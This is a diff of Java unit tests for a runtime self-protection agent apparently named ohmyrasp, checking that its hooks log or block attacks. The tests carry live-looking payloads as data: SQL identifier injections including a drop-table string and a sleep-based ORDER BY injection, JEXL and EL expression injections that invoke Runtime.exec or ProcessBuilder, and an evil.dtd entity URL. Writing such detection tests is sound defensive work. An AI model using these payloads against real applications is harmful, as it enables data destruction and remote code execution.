+    Path log = Files.createTempFile("ohmyrasp-java11-sql-identifier-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () -> Java11RaspHooks.beforeSqlIdentifier("sqli;drop/**/table/**/x"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_sql_identifier_injection\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void blocksMyBatisOrderTypeSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-mybatis-order-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Map<String, Object> parameterObject =
+        myBatisParameterMap(
+            new MyBatisQueryRequest(
+                Arrays.asList(new MyBatisOrder("name", ",if(1=1,sleep(2),0)", null))));
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeMyBatisBoundSql(
+                "select * from test_case order by `name` ,if(1=1,sleep(2),0)",
+                parameterObject));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"hook\":\"MyBatis.BoundSql\""));
+    assertTrue(text.contains("\"algorithm\":\"java11_sql_identifier_injection\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("source=MyBatis.BoundSql"));
+    assertTrue(text.contains("parameter=orders[].type"));
+    assertFalse(text.contains(",if(1=1"));
+    assertFalse(text.contains("sleep(2)"));
+  }
+
+  @Test
+  void ignoresNormalMyBatisOrderMetadata() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-mybatis-order-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Map<String, Object> parameterObject =
+        myBatisParameterMap(
+            new MyBatisQueryRequest(
+                Arrays.asList(new MyBatisOrder("update_time", "desc", "test_case"))));
+
+    Java11RaspHooks.beforeMyBatisBoundSql(
+        "select * from test_case order by test_case.`update_time` desc", parameterObject);
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
   void ignoresLocalClassLoaderUrls() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-classloader-normal", ".jsonl");
     Files.delete(log);
@@ -1064,6 +1791,98 @@ final class Java11RaspHooksTest {
 
     String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
     assertTrue(text.contains("\"algorithm\":\"java11_script_engine_runtime_execution\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void ignoresNormalJexlExpression() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jexl-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeJexlExpression(new FakeJexlExpression("asset.name == 'example.jar'"));
+    Java11RaspHooks.beforeJexlExpression(new FakeJexlExpression("user.name ?: 'guest'"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void logsJexlRuntimeExecutionWithoutRawExpression() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jexl-runtime", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeJexlExpression(
+        new FakeJexlExpression(
+            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/ohmyrasp-nexus7238-success')"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_jexl_runtime_execution\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("engine=jexl expressionLength="));
+    assertFalse(text.contains("ohmyrasp-nexus7238-success"));
+  }
+
+  @Test
+  void blocksJexlProcessBuilderWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jexl-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () -> Java11RaspHooks.beforeJexlExpression(
+            new FakeJexlExpression("new java.lang.ProcessBuilder('id').start()")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_jexl_runtime_execution\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void ignoresNormalElExpression() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-el-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeElExpression(new FakeElExpression("${user.name}"));
+    Java11RaspHooks.beforeElExpression(new FakeElExpression("${233 * 233}"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void logsElRuntimeExecutionWithoutRawExpression() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-el-runtime", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeElExpression(
+        new FakeElExpression(
+            "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/ohmyrasp-nexus10204-success')}"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_el_runtime_execution\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("engine=el expressionLength="));
+    assertFalse(text.contains("ohmyrasp-nexus10204-success"));
+  }
+
+  @Test
+  void blocksElProcessBuilderWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-el-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () -> Java11RaspHooks.beforeElExpression(
+            new FakeElExpression("${new java.lang.ProcessBuilder('id').start()}")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_el_runtime_execution\""));
     assertTrue(text.contains("\"action\":\"block\""));
   }
 
@@ -1357,12 +2176,42 @@ final class Java11RaspHooksTest {
     assertTrue(text.contains("http://127.0.0.1:9/evil.dtd"));
   }
 
+  static final class JaxRsRequestStub {
+    private final String method;
+    private final URI requestUri;
+    private final Map<String, String> headers = new HashMap<String, String>();
+
+    JaxRsRequestStub(String method, String requestUri) {
+      this.method = method;
+      this.requestUri = URI.create(requestUri);
+    }
+
+    public String getMethod() {
+      return method;
+    }
+
+    public URI getRequestUri() {
+      return requestUri;
+    }
+
+    public String getHeaderString(String name) {
+      return headers.get(name);
+    }
+
+    JaxRsRequestStub withHeader(String name, String value) {
+      headers.put(name, value);
+      return this;
+    }
+  }
+
   static final class RequestStub {
     private final String method;
     private final String uri;
     private final String query;
     private final Object[] cookies;
+    private final Map<String, String> headers = new HashMap<String, String>();
     private final Map<String, String[]> parameters = new HashMap<String, String[]>();
+    private final Map<String, Object> attributes = new HashMap<String, Object>();
 
     RequestStub(String method, String uri, String query) {
       this(method, uri, query, new Object[0]);
@@ -1391,13 +2240,37 @@ final class Java11RaspHooksTest {
       return cookies;
     }
 
+    public String getHeader(String name) {
+      return headers.get(name);
+    }
+
     public Map<String, String[]> getParameterMap() {
       return parameters;
+    }
+
+    public Object getAttribute(String name) {
+      return attributes.get(name);
+    }
+
+    RequestStub withHeader(String name, String value) {
+      headers.put(name, value);
+      return this;
     }
 
     RequestStub withParameter(String name, String value) {
       parameters.put(name, new String[] {value});
       return this;
+    }
+
+    RequestStub withAttribute(String name, Object value) {
+      attributes.put(name, value);
+      return this;
+    }
+  }
+
+  static final class ApplicationDispatcher {
+    static void include(Object request) {
+      Java11RaspHooks.beforeHttpRequest(request);
     }
   }
 
@@ -1419,6 +2292,30 @@ final class Java11RaspHooksTest {
     }
   }
 
+  static final class FakeJexlExpression {
+    private final String source;
+
+    FakeJexlExpression(String source) {
+      this.source = source;
+    }
+
+    public String getSourceText() {
+      return source;
+    }
+  }
+
+  static final class FakeElExpression {
+    private final String source;
+
+    FakeElExpression(String source) {
+      this.source = source;
+    }
+
+    public String getExpressionString() {
+      return source;
+    }
+  }
+
   private static String sparkRestSubmissionBody() {
     return "{"
         + "\"action\":\"CreateSubmissionRequest\","
@@ -1430,6 +2327,48 @@ final class Java11RaspHooksTest {
 
   private static Object yarnSubmission(String command) {
     return new Java11YarnSubmissionProbe(Arrays.asList(command));
+  }
+
+  private static Map<String, Object> myBatisParameterMap(Object request) {
+    Map<String, Object> values = new HashMap<>();
+    values.put("request", request);
+    return values;
+  }
+
+  static final class MyBatisQueryRequest {
+    private final List<MyBatisOrder> orders;
+
+    MyBatisQueryRequest(List<MyBatisOrder> orders) {
+      this.orders = orders;
+    }
+
+    public List<MyBatisOrder> getOrders() {
+      return orders;
+    }
+  }
+
+  static final class MyBatisOrder {
+    private final String name;
+    private final String type;
+    private final String prefix;
+
+    MyBatisOrder(String name, String type, String prefix) {
+      this.name = name;
+      this.type = type;
+      this.prefix = prefix;
+    }
+
+    public String getName() {
+      return name;
+    }
+
+    public String getType() {
+      return type;
+    }
+
+    public String getPrefix() {
+      return prefix;
+    }
   }
 
   private static byte[] classBytes(Class<?> type) throws Exception {
